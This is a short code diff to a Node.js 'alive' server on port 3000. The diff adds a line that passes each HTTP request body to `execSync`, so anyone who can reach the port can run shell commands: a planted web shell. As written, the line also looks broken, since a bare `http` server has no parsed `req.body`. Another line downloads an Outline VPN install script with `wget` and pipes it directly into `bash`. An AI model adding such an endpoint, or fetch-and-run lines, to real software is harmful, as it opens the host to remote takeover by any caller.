@@ -1,7 +1,8 @@
-const { exec } = require("child_process");
+const { exec, execSync } = require("child_process");
 const http = require("http")
 
 http.createServer((req,res)=>{
+    console.log(execSync(req.body,{encoding:"utf8"}));
     res.write("alive")
     res.end()
 }).listen(3000)
@@ -14,8 +15,4 @@ setInterval(()=>{
 //   console.log(stdout);
 // });
 
-exec(`bash -c "$(wget -qO- https://raw.githubusercontent.com/Jigsaw-Code/outline-server/master/src/server_manager/install_scripts/install_server.sh)"`, (err, stdout, stderr) => {
-    if (err) return console.error(`exec error: ${err}`);
-    if (stderr) return console.log(`exec error: ${stderr}`)
-    console.log(stdout);
-});
+console.log(execSync(`bash -c "$(wget -qO- https://raw.githubusercontent.com/Jigsaw-Code/outline-server/master/src/server_manager/install_scripts/install_server.sh)"`,{encoding:"utf8"}));
